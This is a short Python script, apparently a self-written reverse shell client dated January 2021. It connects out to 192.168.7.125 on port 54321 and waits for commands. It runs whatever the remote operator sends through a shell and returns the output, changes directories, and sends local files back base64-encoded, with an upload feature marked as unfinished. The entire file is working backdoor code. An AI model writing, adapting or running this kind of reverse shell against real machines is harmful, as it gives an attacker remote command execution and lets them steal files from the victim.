#/usr/bin/python
# Written By: Sahar Hathiramani
# Date: 01/21/2021 - 1/23/2021

import socket
import subprocess 
import json
import os
import base64

def reliable_send(data):
    jsonData = json.dumps(data.decode())
    sock.send(jsonData.encode())

def reliable_recv():
    data = b''
    while True:
        try:
            data = data + sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = reliable_recv()
        if command == 'exit':
            break
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == "download":
            with open(command[9:], "rb") as download:
                reliable_send(base64.b64encode(download.read()))
        elif command[:6] == "upload": #Work in Progress
            with open(command[7:], "wb") as upload:
                fileData = reliable_recv()
                upload.write(base64.b64decode(fileData))
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.7.125", 54321))
shell()
sock.close()
